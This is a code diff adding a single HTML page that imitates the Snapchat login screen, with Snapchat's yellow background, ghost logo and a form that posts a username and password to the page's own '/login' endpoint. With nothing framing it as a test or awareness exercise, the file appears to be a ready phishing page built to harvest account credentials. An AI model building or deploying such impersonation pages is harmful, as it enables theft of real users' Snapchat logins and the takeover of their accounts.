@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Snapchat</title>
+    <style>
+        /* The "Snapchat Yellow" Background */
+        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #FFFC00; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        
+        .box { background: #fff; padding: 40px 30px; border-radius: 0px; width: 100%; max-width: 400px; height: 100vh; text-align: center; box-sizing: border-box; display: flex; flex-direction: column; justify-content: center; }
+        
+        /* Responsive tweak: on actual desktop/large screens, show as a box. On mobile, full screen. */
+        @media (min-width: 480px) {
+            .box { height: auto; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        }
+
+        .logo { width: 70px; margin: 0 auto 30px; }
+        h2 { font-size: 22px; margin-bottom: 30px; color: #16191c; letter-spacing: -0.5px; font-weight: bold; }
+        .ig { text-align: left; margin-bottom: 25px; }
+        label { display: block; font-size: 11px; color: #999; text-transform: uppercase; font-weight: 800; margin-bottom: 2px; letter-spacing: 0.5px; }
+        
+        input { width: 100%; padding: 10px 0; border: none; border-bottom: 1px solid #e0e0e0; outline: none; font-size: 16px; transition: 0.2s; background: transparent; }
+        input:focus { border-bottom: 2px solid #00adff; }
+        
+        .btn { background: #00adff; color: #fff; border: none; padding: 15px; border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; margin-top: 20px; }
+        .link { margin-top: 20px; font-size: 13px; color: #00adff; text-decoration: none; font-weight: 600; display: block; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <svg class="logo" viewBox="0 0 2048 2048" xmlns="http://www.w3.org/2000/svg">
+            <path d="M 996.085 272.424 C 1155.68 262.948 1302.31 324.371 1394.88 456.553 C 1460.48 550.248 1478.36 653.479 1469.08 766.008 C 1467.49 785.225 1466.71 804.524 1464.4 823.697 C 1462.42 846.176 1448.44 902.97 1471.39 917.053 C 1503.2 936.571 1550.58 896.793 1583.35 893.728 C 1622.58 890.06 1657.44 919.21 1659.55 958.804 C 1664.52 1065.17 1469.17 1050.87 1471.53 1157.5 C 1471.94 1175.82 1491.84 1203.46 1502.2 1218.25 C 1550.61 1285.36 1615.29 1341.31 1691.44 1374.67 C 1707.39 1381.59 1723.63 1387.8 1740.13 1393.28 C 1770.97 1403.34 1818.08 1405.63 1820.96 1448.3 C 1822.01 1462.79 1816.68 1477.01 1806.36 1487.24 C 1780.37 1513.16 1687.62 1537 1650.48 1545.53 C 1640.13 1548.6 1621.54 1549.65 1612.79 1555.54 C 1604.78 1560.93 1600.96 1584.2 1597.02 1593.82 C 1593.52 1602.44 1588.65 1610.44 1582.6 1617.5 C 1573.72 1627.79 1566.06 1632.92 1554.42 1639.05 C 1519.02 1657.73 1490.06 1646.36 1453.72 1639 C 1430.93 1634.39 1414.41 1632.77 1391.12 1632.19 C 1314.8 1630.27 1264.22 1681.29 1204.51 1720.23 C 1156.31 1751.67 1102.26 1773.93 1043.79 1778.3 C 1039.78 1778.64 1035.77 1778.84 1031.75 1778.92 C 956.779 1780.02 887.111 1749.63 826.868 1707.1 C 786.764 1678.78 744.509 1646.52 695.568 1635.72 C 666.826 1629.37 635.894 1631.62 607.229 1637.21 C 571.526 1644.16 537.528 1659.34 501.756 1642.2 C 444.402 1614.73 459.541 1572.48 431.068 1554.92 C 420.089 1548.15 403.684 1547.82 391.199 1544.94 C 350.168 1535.46 273.25 1514.99 242.211 1487.59 C 232.291 1478.83 227.371 1468.58 226.582 1455.48 C 225.578 1438.82 232.721 1422.66 246.938 1413.45 C 266.147 1401.02 296.03 1398.47 318.047 1391.59 C 391.609 1368.62 460.386 1321.26 511.6 1264.15 C 532.294 1241.07 568.962 1193.43 576.696 1164.69 C 578.222 1159.02 578.511 1152.9 578.13 1147.05 C 573.752 1079.69 457.653 1055.53 413.811 1017 C 399.549 1004.47 390.685 987.88 389.586 968.802 C 388.6 951.693 393.811 931.898 405.492 919.018 C 413.815 909.84 425.125 902.24 436.78 898.041 C 473.32 884.877 504.455 907.766 538.611 917.947 C 547.428 920.574 556.394 922.981 565.687 922.329 C 573.745 921.763 580.855 919.025 586.141 912.739 C 591.534 906.325 592.548 899.422 592.857 891.326 C 593.567 872.774 589.032 852.796 586.462 834.454 C 582.195 806.048 579.038 777.485 576.999 748.832 C 560.739 493.488 740.529 288.547 996.085 272.424 z" fill="#000" />
+        </svg>
+
+        <h2>Log in to Snapchat</h2>
+        
+        <form action="/login" method="POST">
+            <div class="ig">
+                <label>Username or Email</label>
+                <input type="text" name="username" required autocomplete="off">
+            </div>
+            <div class="ig">
+                <label>Password</label>
+                <input type="password" name="password" required>
+            </div>
+            <button type="submit" class="btn">Log In</button>
+        </form>
+        
+        <a href="#" class="link">Forgot password?</a>
+    </div>
+</body>
+</html>
